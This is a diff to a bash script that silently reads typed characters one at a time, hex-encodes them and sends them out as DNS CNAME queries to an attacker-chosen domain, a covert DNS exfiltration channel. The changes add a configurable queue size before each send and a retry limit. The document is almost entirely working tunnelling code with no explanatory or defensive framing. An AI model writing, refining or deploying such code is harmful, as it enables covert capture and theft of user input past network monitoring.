@@ -3,6 +3,7 @@
 # Usage: command [-flags] domain
 # Options:
 #   -l: localhost
+#   -n: number of characters to store before sending a packet
 
 # check if there are arguments supplied
 if [ $# -eq 0 ]; then
@@ -12,12 +13,15 @@ fi
 
 # set globals
 local_server=""
+char_queue=5
 
 # check command line flags
 while [ $# -gt 0 ]; do
   # check if server is on localhost
   if [ $1 = "-l" ]; then
     local_server="127.0.0.1"
+  elif [ $1 = "-n" ]; then
+    char_queue=$2
   else
     # if it isn't a flag, break out of the loop
     break
@@ -50,17 +54,19 @@ while read -rsN1 letter; do
   letters="$letters$letter"
 
   # if there are more than 4 letters in queue
-  if [ ${#letters} -gt 4 ]; then
+  if [ ${#letters} -ge $char_queue ]; then
     # turn letters to hex
     data=$(echo "$letters" | xxd -ps -c 200 | tr -d '\n' | head -c -2)
     # format into encoding
     encoded="$packet_number.$connection_id.$data.$1"
 
+    retries=0
+
     # send data to server
     ns_out=$(nslookup -query=CNAME $encoded $local_server)
     
     # while the packet failed
-    while [ $? -eq 1 ]; do
+    while [ $? -eq 1 ] && [ $retries -le 5 ]; do
       # get RCODE
       response_code=$(echo $ns_out | awk '{print $NF}')
       if [ $response_code = "NXDOMAIN" ]; then
@@ -81,6 +87,7 @@ while read -rsN1 letter; do
         echo "Unknown error."
       fi
 
+      retries=$(($retries+1))
       # sleep to prevent spamming
       sleep 5
       ns_out=$(nslookup -query=CNAME $encoded $local_server)
